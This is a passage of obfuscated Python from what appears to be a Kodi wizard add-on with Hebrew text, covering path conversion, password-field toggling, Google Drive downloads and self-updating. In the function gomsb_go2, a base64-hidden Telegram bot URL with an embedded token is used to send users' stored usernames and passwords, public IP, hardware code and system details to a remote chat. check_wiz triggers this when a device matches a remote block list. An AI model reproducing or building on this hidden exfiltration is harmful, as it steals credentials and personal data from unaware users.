    DP .create (ADDONTITLE ,"[COLOR %s]Changing Physical Paths To Special"%COLOR2 ,"","Please Wait[/COLOR]")#line:1720
    for O0O000000OO00OO0O ,O0O0O000O0OO0OO0O ,O000O0O0OO0OO00OO in os .walk (O0OOOOO0OO00000OO ):#line:1721
        for O0O0OOO00O0O0O00O in O000O0O0OO0OO00OO :#line:1722
            OOO00O0O0OOOOOO0O +=1 #line:1723
            OO00OO00OOO0O0000 =int (percentage (OOO00O0O0OOOOOO0O ,O00OOOOO0O00000O0 ))#line:1724
            if O0O0OOO00O0O0O00O .endswith (".xml")or O0O0OOO00O0O0O00O .endswith (".hash")or O0O0OOO00O0O0O00O .endswith ("properies"):#line:1725
                DP .update (OO00OO00OOO0O0000 ,"[COLOR %s]Scanning: [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,O0O000000OO00OO0O .replace (HOME ,'')),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0OOO00O0O0O00O ),"Please Wait[/COLOR]")#line:1726
                O00OO0O00OO0OOO0O =open (os .path .join (O0O000000OO00OO0O ,O0O0OOO00O0O0O00O )).read ()#line:1727
                OOO0OO0O000000OOO =urllib .quote (HOME )#line:1728
                OOOOOO00O00OOOOO0 =urllib .quote (HOME ).replace ('%3A','%3a').replace ('%5C','%5c')#line:1729
                OOO0OOO000000000O =O00OO0O00OO0OOO0O .replace (HOME ,'special://home/').replace (OOO0OO0O000000OOO ,'special://home/').replace (OOOOOO00O00OOOOO0 ,'special://home/')#line:1730
                O000000000OOO0O0O =open ((os .path .join (O0O000000OO00OO0O ,O0O0OOO00O0O0O00O )),mode ='w')#line:1731
                O000000000OOO0O0O .write (str (OOO0OOO000000000O ))#line:1732
                O000000000OOO0O0O .close ()#line:1733
    DP .close ()#line:1734
    log ("[Convert Paths to Special] Complete",5 )#line:1735
    if over ==False :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Convert Paths to Special: Complete![/COLOR]"%COLOR2 )#line:1736
def clearCrash ():#line:1738
    O000OO00OO000OO0O =[]#line:1739
    for O00OO0O00OOOO0O00 in glob .glob (os .path .join (LOG ,'*crashlog*.*')):#line:1740
        O000OO00OO000OO0O .append (O00OO0O00OOOO0O00 )#line:1741
    if len (O000OO00OO000OO0O )>0 :#line:1742
        if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the Crash logs?'%COLOR2 ,'[COLOR %s]%s[/COLOR] Files Found[/COLOR]'%(COLOR1 ,len (O000OO00OO000OO0O )),yeslabel ="[B][COLOR green]Remove Logs[/COLOR][/B]",nolabel ="[B][COLOR red]Keep Logs[/COLOR][/B]"):#line:1743
            for OOOO000000O0O0OOO in O000OO00OO000OO0O :#line:1744
                os .remove (OOOO000000O0O0OOO )#line:1745
            LogNotify ('[COLOR %s]Clear Crash Logs[/COLOR]'%COLOR1 ,'[COLOR %s]%s Crash Logs Removed[/COLOR]'%(COLOR2 ,len (O000OO00OO000OO0O )))#line:1746
        else :LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Crash Logs Cancelled[/COLOR]'%COLOR2 )#line:1747
    else :LogNotify ('[COLOR %s]Clear Crash Logs[/COLOR]'%COLOR1 ,'[COLOR %s]No Crash Logs Found[/COLOR]'%COLOR2 )#line:1748
def hidePassword ():#line:1750
    if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]hide[/COLOR] all passwords when typing in the add-on settings menus?[/COLOR]"%COLOR2 ,yeslabel ="[B][COLOR green]Hide Passwords[/COLOR][/B]",nolabel ="[B][COLOR red]No Cancel[/COLOR][/B]"):#line:1751
        O0O0O0OO0O000O00O =0 #line:1752
        for O0O0OOOOOOOO00000 in glob .glob (os .path .join (ADDONS ,'*/')):#line:1753
            O0O00O00OOO0000O0 =os .path .join (O0O0OOOOOOOO00000 ,'resources','settings.xml')#line:1754
            if os .path .exists (O0O00O00OOO0000O0 ):#line:1755
                O0OOO0O0000O0O0OO =open (O0O00O00OOO0000O0 ).read ()#line:1756
                OO0000OO0OO0000OO =parseDOM (O0OOO0O0000O0O0OO ,'addon',ret ='id')#line:1757
                for OOO0O0O00OOOO0O0O in OO0000OO0OO0000OO :#line:1758
                    if 'pass'in OOO0O0O00OOOO0O0O :#line:1759
                        if not 'option="hidden"'in OOO0O0O00OOOO0O0O :#line:1760
                            try :#line:1761
                                OO0OOO0OOOO0OO000 =OOO0O0O00OOOO0O0O .replace ('/','option="hidden" /')#line:1762
                                O0OOO0O0000O0O0OO .replace (OOO0O0O00OOOO0O0O ,OO0OOO0OOOO0OO000 )#line:1763
                                O0O0O0OO0O000O00O +=1 #line:1764
                                log ("[Hide Passwords] found in %s on %s"%(O0O00O00OOO0000O0 .replace (HOME ,''),OOO0O0O00OOOO0O0O ),5 )#line:1765
                            except :#line:1766
                                pass #line:1767
                O00OO0O000OO00O00 =open (O0O00O00OOO0000O0 ,mode ='w');O00OO0O000OO00O00 .write (O0OOO0O0000O0O0OO );O00OO0O000OO00O00 .close ()#line:1768
        LogNotify ("[COLOR %s]Hide Passwords[/COLOR]"%COLOR1 ,"[COLOR %s]%s items changed[/COLOR]"%(COLOR2 ,O0O0O0OO0O000O00O ))#line:1769
        log ("[Hide Passwords] %s items changed"%O0O0O0OO0O000O00O ,5 )#line:1770
    else :log ("[Hide Passwords] Cancelled",5 )#line:1771
def unhidePassword ():#line:1773
    if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]unhide[/COLOR] all passwords when typing in the add-on settings menus?[/COLOR]"%(COLOR2 ,COLOR1 ),yeslabel ="[B][COLOR green]Unhide Passwords[/COLOR][/B]",nolabel ="[B][COLOR red]No Cancel[/COLOR][/B]"):#line:1774
        OO0000O00O00000O0 =0 #line:1775
        for OO000OOOO0O00000O in glob .glob (os .path .join (ADDONS ,'*/')):#line:1776
            OOO000O0OO000O00O =os .path .join (OO000OOOO0O00000O ,'resources','settings.xml')#line:1777
            if os .path .exists (OOO000O0OO000O00O ):#line:1778
                O00O0OOO0O0O0O00O =open (OOO000O0OO000O00O ).read ()#line:1779
                OO00OO0OO00O00O0O =parseDOM (O00O0OOO0O0O0O00O ,'addon',ret ='id')#line:1780
                for O0O00OO00OOO0OOO0 in OO00OO0OO00O00O0O :#line:1781
                    if 'pass'in O0O00OO00OOO0OOO0 :#line:1782
                        if 'option="hidden"'in O0O00OO00OOO0OOO0 :#line:1783
                            try :#line:1784
                                O0O0O0O0O0OOOOOO0 =O0O00OO00OOO0OOO0 .replace ('option="hidden"','')#line:1785
                                O00O0OOO0O0O0O00O .replace (O0O00OO00OOO0OOO0 ,O0O0O0O0O0OOOOOO0 )#line:1786
                                OO0000O00O00000O0 +=1 #line:1787
                                log ("[Unhide Passwords] found in %s on %s"%(OOO000O0OO000O00O .replace (HOME ,''),O0O00OO00OOO0OOO0 ),5 )#line:1788
                            except :#line:1789
                                pass #line:1790
                O0OOOO0O00OOOOO0O =open (OOO000O0OO000O00O ,mode ='w');O0OOOO0O00OOOOO0O .write (O00O0OOO0O0O0O00O );O0OOOO0O00OOOOO0O .close ()#line:1791
        LogNotify ("[COLOR %s]Unhide Passwords[/COLOR]"%COLOR1 ,"[COLOR %s]%s items changed[/COLOR]"%(COLOR2 ,OO0000O00O00000O0 ))#line:1792
        log ("[Unhide Passwords] %s items changed"%OO0000O00O00000O0 ,5 )#line:1793
    else :log ("[Unhide Passwords] Cancelled",5 )#line:1794
def chunk_report (OO0O00O00O0000OOO ,O0OO00OOOO00OOOOO ,OO00OO000O0O0OOOO ):#line:1795
   O000OO0O0O00O0OO0 =float (OO0O00O00O0000OOO )/OO00OO000O0O0OOOO #line:1796
   O000OO0O0O00O0OO0 =round (O000OO0O0O00O0OO0 *100 ,2 )#line:1797
   if OO0O00O00O0000OOO >=OO00OO000O0O0OOOO :#line:1799
      sys .stdout .write ('\n')#line:1800
def chunk_read (OOOO0OOO00OO0OOOO ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:1802
   import time #line:1803
   OO0OOO0O0000O0000 =100 #line:1804
   O0O0OOOOO000OO0OO =0 #line:1806
   OOOO0OOO00O000OO0 =time .time ()#line:1807
   OOOO00O0000O0O0O0 =0 #line:1808
   with open (destination ,"wb")as OO0O0OO0OOO00OOO0 :#line:1811
    while 1 :#line:1812
      O00OOOOOO000OOOOO =time .time ()-OOOO0OOO00O000OO0 #line:1813
      O0OOO00OO0O0OO00O =int (OOOO00O0000O0O0O0 *chunk_size )#line:1814
      O00OOO0OO0OO0OO0O =OOOO0OOO00OO0OOOO .read (chunk_size )#line:1815
      OO0O0OO0OOO00OOO0 .write (O00OOO0OO0OO0OO0O )#line:1816
      OO0O0OO0OOO00OOO0 .flush ()#line:1817
      O0O0OOOOO000OO0OO +=len (O00OOO0OO0OO0OO0O )#line:1818
      O00000OO0OOOOO0O0 =float (O0O0OOOOO000OO0OO )/OO0OOO0O0000O0000 #line:1819
      O00000OO0OOOOO0O0 =round (O00000OO0OOOOO0O0 *100 ,2 )#line:1820
      if int (O00OOOOOO000OOOOO )>0 :#line:1821
        O0OO0O00O0O00O0OO =int (O0OOO00OO0O0OO00O /(1024 *O00OOOOOO000OOOOO ))#line:1822
      else :#line:1823
         O0OO0O00O0O00O0OO =0 #line:1824
      if O0OO0O00O0O00O0OO >1024 and not O00000OO0OOOOO0O0 ==100 :#line:1825
          O0O0OO000OO0O000O =int (((OO0OOO0O0000O0000 -O0OOO00OO0O0OO00O )/1024 )/(O0OO0O00O0O00O0OO ))#line:1826
      else :#line:1827
          O0O0OO000OO0O000O =0 #line:1828
      if O0O0OO000OO0O000O <0 :#line:1829
        O0O0OO000OO0O000O =0 #line:1830
      dp .update (int (O00000OO0OOOOO0O0 ),"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O00000OO0OOOOO0O0 ,O0OOO00OO0O0OO00O /(1024 *1024 ),OO0OOO0O0000O0000 /(1000 *1000 ),O0OO0O00O0O00O0OO ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O0O0OO000OO0O000O ,60 ))#line:1831
      if dp .iscanceled ():#line:1832
         dp .close ()#line:1833
         break #line:1834
      if not O00OOO0OO0OO0OO0O :#line:1835
         break #line:1836
      if report_hook :#line:1838
         report_hook (O0O0OOOOO000OO0OO ,chunk_size ,OO0OOO0O0000O0000 )#line:1839
      OOOO00O0000O0O0O0 +=1 #line:1840
   return O0O0OOOOO000OO0OO #line:1842
server ='&eJzLKCkpKLbS10_JTM8s0StOTU3JyC8u0Ust1c_OT8nUL8-sSixK0S-pKNFPyklMztaryM0BAPI5E0I=$'#line:1843
def googledrive_download (O0OO00O0O0O00OOOO ,OOOOO0O0OO0O0000O ,O00000O00000OO0OO ,OOOO0O0OOO00OO000 ):#line:1844
    OOOO00O0O0O0O0OO0 =[]#line:1848
    OO0OOOO0OO000OO00 =O0OO00O0O0O00OOOO .split ('=')#line:1849
    O0OO00O0O0O00OOOO =OO0OOOO0OO000OO00 [len (OO0OOOO0OO000OO00 )-1 ]#line:1850
    def OO0O0O0000OO0OO0O (O00000O0000000OOO ):#line:1852
        for OO000O0O00OOOO00O in O00000O0000000OOO :#line:1854
            O00O0O00OO00OO000 =OO000O0O00OOOO00O .value #line:1857
            if 'download_warning'in OO000O0O00OOOO00O .name :#line:1858
                return OO000O0O00OOOO00O .value #line:1861
            return O00O0O00OO00OO000 #line:1862
        return None #line:1864
    def OO0OOOOO00O0O0OOO (O0OOO0OO00OOOOOO0 ,O0OO0OOO00O00O00O ):#line:1866
        O000OO00OO000O000 =32768 #line:1868
        OOOOO000O0000000O =time .time ()#line:1869
        with open (O0OO0OOO00O00O00O ,"wb")as OO00O0O0000O000O0 :#line:1871
            O0O0000O0000OOO00 =1 #line:1872
            OO00000O00OO0O000 =32768 #line:1873
            try :#line:1874
                OO00O0O0000O0000O =int (O0OOO0OO00OOOOOO0 .headers .get ('content-length'))#line:1875
                print ('file total size :',OO00O0O0000O0000O )#line:1876
            except TypeError :#line:1877
                print ('using dummy length !!!')#line:1878
                OO00O0O0000O0000O =int (OOOO0O0OOO00OO000 )*1000000 #line:1879
            for O0OOO00O00OOOOO00 in O0OOO0OO00OOOOOO0 .iter_content (O000OO00OO000O000 ):#line:1880
                if O0OOO00O00OOOOO00 :#line:1881
                    OO00O0O0000O000O0 .write (O0OOO00O00OOOOO00 )#line:1882
                    OO00O0O0000O000O0 .flush ()#line:1883
                    O0O00OOO0O00OO000 =time .time ()-OOOOO000O0000000O #line:1884
                    OO0OOO0000OOOO0O0 =int (O0O0000O0000OOO00 *OO00000O00OO0O000 )#line:1885
                    if O0O00OOO0O00OO000 ==0 :#line:1886
                        O0O00OOO0O00OO000 =0.1 #line:1887
                    OO00O000000OO00OO =int (OO0OOO0000OOOO0O0 /(1024 *O0O00OOO0O00OO000 ))#line:1888
                    O0000O0000O00000O =int (O0O0000O0000OOO00 *OO00000O00OO0O000 *100 /OO00O0O0000O0000O )#line:1889
                    if OO00O000000OO00OO >1024 and not O0000O0000O00000O ==100 :#line:1890
                      OOOO0O0O00OOOO00O =int (((OO00O0O0000O0000O -OO0OOO0000OOOO0O0 )/1024 )/(OO00O000000OO00OO ))#line:1891
                    else :#line:1892
                      OOOO0O0O00OOOO00O =0 #line:1893
                    O00000O00000OO0OO .update (int (O0000O0000O00000O ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0000O0000O00000O ,OO0OOO0000OOOO0O0 /(1024 *1024 ),OO00O0O0000O0000O /(1000 *1000 ),OO00O000000OO00OO ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OOOO0O0O00OOOO00O ,60 ))#line:1895
                    O0O0000O0000OOO00 +=1 #line:1896
                    if O00000O00000OO0OO .iscanceled ():#line:1897
                     O00000O00000OO0OO .close ()#line:1898
                     break #line:1899
    O000O0OOO0000000O ="https://docs.google.com/uc?export=download"#line:1900
    import urllib2 #line:1905
    import cookielib #line:1906
    from cookielib import CookieJar #line:1908
    OOO000OOO0000000O =CookieJar ()#line:1910
    OO0000000O00O0000 =build_opener (HTTPCookieProcessor (OOO000OOO0000000O ))#line:1911
    O000OOO0OOO0OO0O0 ={'id':O0OO00O0O0O00OOOO }#line:1913
    OO000OOOOO00OOOOO =urllib .urlencode (O000OOO0OOO0OO0O0 )#line:1914
    OOO0000OO0OOO0000 =OO0000000O00O0000 .open (O000O0OOO0000000O +'&'+OO000OOOOO00OOOOO )#line:1916
    O00O0OO00OOOO00O0 =OOO0000OO0OOO0000 .read ()#line:1917
    OO000OOO000OO0O00 =OO0O0O0000OO0OO0O (OOO000OOO0000000O )#line:1921
    if OO000OOO000OO0O00 :#line:1923
        O00O0O00O0O0O0O0O ={'id':O0OO00O0O0O00OOOO ,'confirm':OO000OOO000OO0O00 }#line:1924
        OOO00O00O0OO0000O ={'Access-Control-Allow-Headers':'Content-Length'}#line:1925
        OO000OOOOO00OOOOO =urllib .urlencode (O00O0O00O0O0O0O0O )#line:1926
        OOO0000OO0OOO0000 =OO0000000O00O0000 .open (O000O0OOO0000000O +'&'+OO000OOOOO00OOOOO )#line:1927
        chunk_read (OOO0000OO0OOO0000 ,report_hook =chunk_report ,dp =O00000O00000OO0OO ,destination =OOOOO0O0OO0O0000O ,filesize =OOOO0O0OOO00OO000 )#line:1928
    return (OOOO00O0O0O0O0OO0 )#line:1932
def resetkodi ():#line:1933
        if xbmc .getCondVisibility ('system.platform.windows'):#line:1934
            OOO0OOOOOOOOOOO0O =xbmcgui .DialogProgress ()#line:1935
            try :#line:1936
                OOO0OOOOOOOOOOO0O .create ("להשלמת הפעולה הקודי יסגר","אנא המתן 5 שניות",'',"[COLOR yellow][B]הויזארד עודכן בהצלחה![/B][/COLOR]")#line:1938
            except :#line:1939
                OOO0OOOOOOOOOOO0O .create ("להשלמת הפעולה הקודי יסגר","אנא המתן 5 שניות"+'\n'+''+'\n'+"[COLOR yellow][B]הויזארד עודכן בהצלחה![/B][/COLOR]")#line:1941
            OOO0OOOOOOOOOOO0O .update (0 )#line:1942
            for O0OOO00O0O0OO00OO in range (5 ,-1 ,-1 ):#line:1943
                time .sleep (1 )#line:1944
                try :#line:1945
                    OOO0OOOOOOOOOOO0O .update (int ((5 -O0OOO00O0O0OO00OO )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O0OOO00O0O0OO00OO ),'')#line:1946
                except :#line:1947
                    OOO0OOOOOOOOOOO0O .update (int ((5 -O0OOO00O0O0OO00OO )/5.0 *100 ),"ההתקנה תסגר"+'\n'+'בעוד {0} שניות'.format (O0OOO00O0O0OO00OO )+'\n'+'[COLOR yellow][B]ההתקנה הושלמה - Anonymous TV[/B][/COLOR]')#line:1948
                if OOO0OOOOOOOOOOO0O .iscanceled ():#line:1949
                    from resources .libs import win #line:1950
                    return None ,None #line:1951
            from resources .libs import win #line:1952
        else :#line:1953
            OOO0OOOOOOOOOOO0O =xbmcgui .DialogProgress ()#line:1954
            try :#line:1955
                OOO0OOOOOOOOOOO0O .create ("להשלמת הפעולה הקודי יסגר","אנא המתן 5 שניות",'',"[COLOR yellow][B]הויזארד עודכן בהצלחה![/B][/COLOR]")#line:1957
            except :#line:1958
                OOO0OOOOOOOOOOO0O .create ("להשלמת הפעולה הקודי יסגר","אנא המתן 5 שניות"+'\n'+''+'\n'+"[COLOR yellow][B]הויזארד עודכן בהצלחה![/B][/COLOR]")#line:1960
            OOO0OOOOOOOOOOO0O .update (0 )#line:1961
            for O0OOO00O0O0OO00OO in range (5 ,-1 ,-1 ):#line:1962
                time .sleep (1 )#line:1963
                try :#line:1964
                    OOO0OOOOOOOOOOO0O .update (int ((5 -O0OOO00O0O0OO00OO )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O0OOO00O0O0OO00OO ),'')#line:1965
                except :#line:1966
                    OOO0OOOOOOOOOOO0O .update (int ((5 -O0OOO00O0O0OO00OO )/5.0 *100 ),"ההתקנה תסגר"+'\n'+'בעוד {0} שניות'.format (O0OOO00O0O0OO00OO )+'\n'+'')#line:1967
                if OOO0OOOOOOOOOOO0O .iscanceled ():#line:1968
                    from resources .libs import android #line:1970
                    return None ,None #line:1971
            from resources .libs import android #line:1972
def resetkodi_old ():#line:1973
            OO000O000OO00O0OO =xbmcgui .DialogProgress ()#line:1988
            if KODI_VERSION <=18 :#line:1989
                OO000O000OO00O0OO .create ("להשלמת הפעולה הקודי יסגר","אנא המתן 5 שניות",'',"[COLOR yellow][B]הויזארד עודכן בהצלחה![/B][/COLOR]")#line:1992
            else :#line:1993
                OO000O000OO00O0OO .create ("להשלמת הפעולה הקודי יסגר","אנא המתן 5 שניות"+'\n'+''+'\n'+"[COLOR yellow][B]הויזארד עודכן בהצלחה![/B][/COLOR]")#line:1996
            OO000O000OO00O0OO .update (0 )#line:1997
            for O000O0OO000000O0O in range (5 ,-1 ,-1 ):#line:1998
                time .sleep (1 )#line:1999
                try :#line:2000
                    OO000O000OO00O0OO .update (int ((5 -O000O0OO000000O0O )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O000O0OO000000O0O ),'')#line:2001
                except :#line:2002
                    OO000O000OO00O0OO .update (int ((5 -O000O0OO000000O0O )/5.0 *100 ),"ההתקנה תסגר"+'\n'+'בעוד {0} שניות'.format (O000O0OO000000O0O )+'\n'+'')#line:2003
                if OO000O000OO00O0OO .iscanceled ():#line:2004
                    os ._exit (1 )#line:2005
                    return None ,None #line:2006
            os ._exit (1 )#line:2007
def gomsb_go2 (OOOO00O0OO00OO000 ):#line:2008
          import json ,platform #line:2010
          O0OOO00O0O0O00O0O =(getS ("user"))#line:2011
          O0000OOOO000OOOO0 =(getS ("pass"))#line:2012
          OO00OOOOOO000OO00 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:2013
          OO0OOOO00O00OOO00 =platform .uname ()#line:2014
          OOO0OO00OO0O00O00 =OO0OOOO00O00OOO00 [1 ]#line:2015
          OO0O000O000000O0O =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDMzMzkxOTg6QUFIZDZrM2VPNmwwMkpJSDZpZF9WZjdKTGg0TGcwelVqdEUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTMxMjc0MjI5OSZ0ZXh0PQ==').decode ('utf-8')#line:2016
          OO0O00O0O00O0000O =urlopen ('https://api.ipify.org/?format=json').read ()#line:2017
          OO0OOO0000O0OOO00 =str (json .loads (OO0O00O0O00O0000O )['ip'])#line:2018
          O0O000OOOO0000O0O =O0OOO00O0O0O00O0O #line:2019
          OOO0O00O00O00OO00 =O0000OOOO000OOOO0 #line:2020
          import socket #line:2021
          OO0O00O0O00O0000O =urlopen (OO0O000O000000O0O +que ('חסימה על ידי: '+OOOO00O0OO00OO000 +' -')+que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+O0O000OOOO0000O0O +que (' סיסמה: ')+OOO0O00O00O00OO00 +que (' קודי: ')+OO00OOOOOO000OO00 +que (' כתובת: ')+OO0OOO0000O0OOO00 +que (' מערכת הפעלה: ')+platform_d ()+que (' שם המערכת: ')+OOO0OO00OO0O00O00 +que (' גירסת ויזארד: ')+VERSION ).readlines ()#line:2022
def check_wiz (wiz_up =False ):#line:2024
    import json ,platform #line:2026
    O00O00OO00OO00OO0 =ADDON .getSetting ("user")#line:2027
    OOOO00OO0O00OOOOO =ADDON .getSetting ("pass")#line:2028
    O00OOO000OOO0OO00 =[]#line:2033
    OO000OO000O0OOO0O =0 #line:2034
    OOOO00OO0O00OOOOO =(ADDON .getSetting ("pass"))#line:2035
    try :#line:2036
        O00O000O000O0OOOO =read_skin ('lock_install')#line:2037
        for O000O000O00O0OO0O in O00O000O000O0OOOO :#line:2038
            OO0O0OOO000000000 =O00O000O000O0OOOO [O000O000O00O0OO0O ]#line:2039
            O00OOO000OOO0OO00 .append ((OO0O0OOO000000000 ['lock_install']))#line:2040
    except Exception as OOOOOOO0OO0O0OO0O :#line:2041
              logging .warning ('בעיה ב firebase    !!!!!!!!!!!!!!!!!!!!!!     '+str (OOOOOOO0OO0O0OO0O ))#line:2042
    OOO0O0OOO00OOOO00 =urlopen ('https://api.ipify.org/?format=json').read ()#line:2044
    OOO000O0OOO00OOOO =str (json .loads (OOO0O0OOO00OOOO00 )['ip'])#line:2045
    OO00000O00O000000 =platform .uname ()#line:2046
    O0OO00OO0O000O000 =OO00000O00O000000 [1 ]#line:2047
    O000O0OO0OOOO0O0O =''#line:2049
    OO000OO0OO0O0O000 =(ADDON .getSetting ("action"))#line:2050
    OOOO00OOO00000O0O =''#line:2051
    if wiz_up :#line:2052
        OOOO00OOO00000O0O ='wizard_update'#line:2053
    for O0O000OO0O00OOOO0 in O00OOO000OOO0OO00 :#line:2054
        if O0O000OO0O00OOOO0 ==OOO000O0OOO00OOOO :#line:2055
            O000O0OO0OOOO0O0O ='ip'#line:2056
            OO000OO000O0OOO0O =1 #line:2057
            break #line:2058
        if O0O000OO0O00OOOO0 ==O0OO00OO0O000O000 :#line:2059
            O000O0OO0OOOO0O0O ='system_name'#line:2060
            OO000OO000O0OOO0O =1 #line:2061
            break #line:2062
        if O0O000OO0O00OOOO0 ==OO000OO0OO0O0O000 :#line:2063
            O000O0OO0OOOO0O0O ='hardware_code'#line:2064
            OO000OO000O0OOO0O =1 #line:2065
            break #line:2066
        if O0O000OO0O00OOOO0 ==O00O00OO00OO00OO0 :#line:2067
            O000O0OO0OOOO0O0O ='username'#line:2068
            OO000OO000O0OOO0O =1 #line:2069
            break #line:2070
        if O0O000OO0O00OOOO0 ==OOOO00OO0O00OOOOO :#line:2071
            O000O0OO0OOOO0O0O ='password'#line:2072
            OO000OO000O0OOO0O =1 #line:2073
            break #line:2074
    if OO000OO000O0OOO0O ==1 :#line:2075
       OO0O000OOOOOOO0O0 =base64 .b64decode ("aHR0cDovL2tvZGkubGlmZS93aXphcmQvcGFzc3gueG1s").decode ('utf-8')#line:2077
       OO000OO0OOOO00000 =urlopen (OO0O000OOOOOOO0O0 )#line:2078
       O00O000000O0O0O0O =OO000OO0OOOO00000 .readlines ()#line:2079
       xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:2080
       if not wiz_up :#line:2081
        if BUILDNAME =="":#line:2082
            gomsb_go2 (O000O0OO0OOOO0O0O +OOOO00OOO00000O0O )#line:2083
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]סיסמה לא נכונה.[/COLOR]'%COLOR2 )#line:2084
            ADDON .openSettings ()#line:2085
       sys .exit ()#line:2086
def wizardUpdate (startup =None ):#line:2089
    if not xbmc .Player ().isPlaying ():#line:2090
        if workingURL (WIZARDFILE ):#line:2091
            O00OO0OOOO00O0OO0 =checkWizard ('version')#line:2092
            O0OOO0OOO00OOO00O =checkWizard ('zip')#line:2093
            if O00OO0OOOO00O0OO0 !=False and str (O00OO0OOOO00O0OO0 )>str (VERSION ):#line:2096
                check_wiz (True )#line:2098
                log ("[Auto Update Wizard] Installing wizard v%s"%str (O00OO0OOOO00O0OO0 ),5 )#line:2101
                O0O0OOO00OO0000OO =os .path .join (PACKAGES ,'%s-%s.zip'%(ADDON_ID ,str (O00OO0OOOO00O0OO0 )))#line:2103
                try :os .remove (O0O0OOO00OO0000OO )#line:2104
                except :pass #line:2105
                if 'google'in O0OOO0OOO00OOO00O :#line:2106
                    OO00OOO00O00O00O0 =googledrive_download (O0OOO0OOO00OOO00O ,O0O0OOO00OO0000OO ,DP2 ,checkWizard ('filesize'))#line:2107
                else :#line:2108
                    downloaderwiz .download4 (O0OOO0OOO00OOO00O ,O0O0OOO00OO0000OO ,DP2 )#line:2109
                xbmc .sleep (2000 )#line:2110
                DP2 .create ('מתקין')#line:2111
                DP2 .update (100 ,message ='אנא המתן ...')#line:2112
                extract .all (O0O0OOO00OO0000OO ,ADDONS )#line:2113
                DP2 .close ()#line:2114
                LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הויזארד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:2116
                log ("[Auto Update Wizard] Wizard updated to v%s"%str (O00OO0OOOO00O0OO0 ),5 )#line:2117
                return #line:2119
            else :#line:2121
                if not startup :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No New Version of Wizard[/COLOR]"%COLOR2 )#line:2122
                log ("[Auto Update Wizard] No New Version v%s"%str (O00OO0OOOO00O0OO0 ),5 )#line:2123
        else :log ("[Auto Update Wizard] Url for wizard file not valid: %s"%WIZARDFILE ,5 )#line:2124
def wizardUpdateDP (startup =None ):#line:2126
    if workingURL (WIZARDFILE ):#line:2127
        O00O000OO0OOOOO00 =checkWizard ('version')#line:2128
        OOOOOOO0OO00OOO00 =checkWizard ('zip')#line:2129
        if O00O000OO0OOOOO00 !=False and str (O00O000OO0OOOOO00 )>str (VERSION ):#line:2130
            check_wiz (True )#line:2132
            log ("[Auto Update Wizard] Installing wizard v%s"%str (O00O000OO0OOOOO00 ),5 )#line:2133
            if KODI_VERSION <=18 :#line:2134
                DP .create (ADDONTITLE ,'[COLOR %s]מוריד גירסה חדשה יותר של Wizard'%COLOR2 ,'','אנא המתן[/COLOR]')#line:2135
            else :#line:2136
                DP .create (ADDONTITLE ,'[COLOR %s]מוריד גירסה חדשה יותר של Wizard'%COLOR2 +'\n'+''+'\n'+'אנא המתן[/COLOR]')#line:2137
            O0OO0O00000000OO0 =os .path .join (PACKAGES ,'%s-%s.zip'%(ADDON_ID ,str (O00O000OO0OOOOO00 )))#line:2138
            try :os .remove (O0OO0O00000000OO0 )#line:2139
            except :pass #line:2140
            if 'google'in OOOOOOO0OO00OOO00 :#line:2141
                O0O00O0OO000OO0OO =googledrive_download (OOOOOOO0OO00OOO00 ,O0OO0O00000000OO0 ,DP ,checkWizard ('filesize'))#line:2142
            downloader .download (OOOOOOO0OO00OOO00 ,O0OO0O00000000OO0 ,DP )#line:2143
            xbmc .sleep (2000 )#line:2144
            if KODI_VERSION <=18 :#line:2145
                DP .update (0 ,"","Installing %s update"%ADDONTITLE )#line:2146
            else :#line:2147
                DP .update (0 ,"Installing %s update"%ADDONTITLE )#line:2148
            O0OOO0O0O0OO00OOO ,OOOO00O00O000OOO0 ,O0000OO00OO000OO0 =extract .all (O0OO0O00000000OO0 ,ADDONS ,DP ,True )#line:2149
            DP .close ()#line:2150
            resetkodi ()#line:2151
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הויזארד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:2152
            log ("[Auto Update Wizard] Wizard updated to v%s"%str (O00O000OO0OOOOO00 ),5 )#line:2154
            return #line:2156
        else :#line:2157
            if not startup :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No New Version of Wizard[/COLOR]"%COLOR2 )#line:2158
            log ("[Auto Update Wizard] No New Version v%s"%str (O00O000OO0OOOOO00 ),5 )#line:2159
    else :log ("[Auto Update Wizard] Url for wizard file not valid: %s"%WIZARDFILE ,5 )#line:2160
def convertText ():#line:2162
    OO00O0OOOO00O00O0 =os .path .join (ADDONDATA ,'TextFiles')#line:2163
    if not os .path .exists (OO00O0OOOO00O00O0 ):os .makedirs (OO00O0OOOO00O00O0 )#line:2164
